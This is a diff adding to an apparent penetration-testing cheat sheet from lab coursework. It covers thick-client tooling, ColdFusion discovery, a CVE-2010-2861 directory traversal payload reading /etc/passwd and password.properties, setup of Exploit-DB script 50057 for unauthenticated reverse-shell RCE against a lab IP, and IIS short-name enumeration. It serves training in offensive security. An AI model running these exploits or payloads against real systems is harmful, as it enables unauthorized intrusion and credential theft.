@@ -707,9 +707,134 @@ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u Testf
 
 ## Attacking Thick Client Applications
 
+### Tools
+
+#### Information Gathering
+
+- [CFF Explorer](https://ntcore.com/explorer-suite/)
+- [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
+- [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
+- [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)
+
+#### Client Side attacks (Static and Dynamic analysis)
+
+- [Ghidra](https://github.com/NationalSecurityAgency/ghidra)
+- [IDA](https://hex-rays.com/ida-pro)
+- [OllyDbg](https://www.ollydbg.de/)
+- [Radare2](https://www.radare.org/n/)
+- [dnSpy](https://github.com/dnSpy/dnSpy)
+- [x64dbg](https://x64dbg.com/)
+- [JADX](https://github.com/skylot/jadx)
+- [Frida](https://frida.re/)
+
+#### Network Side Attacks
+
+- [Wireshark](https://www.wireshark.org/)
+- [tcpdump](https://www.tcpdump.org/)
+- [TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)
+- [Burp Suite](https://portswigger.net/burp)
+
+#### Server Side Attacks
+
+Similar to web application attacks, focus on OWASP top 10
+
+## ColdFusion
+
+- ColdFusion is a programming language and a web application development platform based on Java
+- ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion
+- Coldfusion default ports:
+
+| Port Number | Protocol | Description |
+|-------------|----------|-------------|
+| 80          | HTTP     | Non-secure HTTP communication between web server and browser |
+| 443         | HTTPS    | Secure HTTP communication with encryption between web server and browser |
+| 1935        | RPC      | Remote Procedure Call for client-server communication across networks |
+| 25          | SMTP     | Simple Mail Transfer Protocol for sending email messages |
+| 8500        | SSL      | Secure Socket Layer for server communication |
+| 5500        | Server Monitor | Remote administration of the ColdFusion server |
 
 
+### Discovery & Enumeration
 
+- Ways to detect Coldfusion:
 
+| Method          | Description                                                                 |
+|-----------------|-----------------------------------------------------------------------------|
+| Port Scanning   | ColdFusion uses port 80 (HTTP) and 443 (HTTPS) by default Nmap service scan may identify ColdFusion |
+| File Extensions | Pages use cfm or cfc extensions Presence indicates ColdFusion              |
+| HTTP Headers    | Look for "Server: ColdFusion" or "X-Powered-By: ColdFusion" in response headers |
+| Error Messages  | Errors may reference ColdFusion-specific tags or functions                 |
+| Default Files   | Check for files like admincfm or CFIDE/administrator/indexcfm              |
 
+- Conduct an nmap scan to check for open ports:
+```bash
+nmap -p- -sC -Pn 10.129.156.229 --open
+```
+- Navigate to found open ports: ```http://10.129.156.229:8500/```
+- Navigate around any found directories
+
+### Attacking ColdFusion
+
+- Check for existing exploits relating to the found version number
+```bash
+searchsploit adobe coldfusion
+```
+
+#### Directory Traversal
+
+- CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit:
+    - CFIDE/administrator/settings/mappings.cfm
+    - logging/settings.cfm
+    - datasources/index.cfm
+    - j2eepackaging/editarchive.cfm
+    - CFIDE/administrator/enter.cfm
+- Attempt directory traversal: ```http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd```
+- Directory traversal with known exploit:
+```bash
+searchsploit -p 14641 # copy exploits path to clipboard
+cp /usr/share/exploitdb/exploits/multiple/remote/14641.py . # copy to current directory
+python2 14641.py # shows required options
+python2 14641.py 10.129.82.113 8500 "../../../../../../../../ColdFusion8/lib/password.properties" # execute script
+```
+
+#### Unauthenticated RCE
+
+- Copy exploit to current directory
+```bash
+searchsploit -p 50057 # copy exploits path to clipboard
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+```
+- Set variables in the exploit code
+```python
+if __name__ == '__main__':
+    # Define some information
+    lhost = '10.10.14.186' # HTB VPN IP
+    lport = 4444 # A port not in use on localhost
+    rhost = "10.129.82.113" # Target IP
+    rport = 8500 # Target Port
+    filename = uuid.uuid4().hex
+```
+- Execute exploit
+```bash
+python3 50057.py 
+```
+
+## IIS Tilde Enumeration
+
+- Map target:
+```bash
+nmap -p- -sV -sC --open 10.129.109.78
+```
+- Try tilde enumeration of short names ([Files to download](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release))
+```bash
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.109.78/
+```
+- Create wordlist of filenames that match the found short name (```TRANSF~1.ASP```)
+```bash
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+```
+- Enumerate with gobuster
+```bash
+gobuster dir -u http://10.129.109.78/ -w /tmp/list.txt -x .aspx,.asp
+```
 
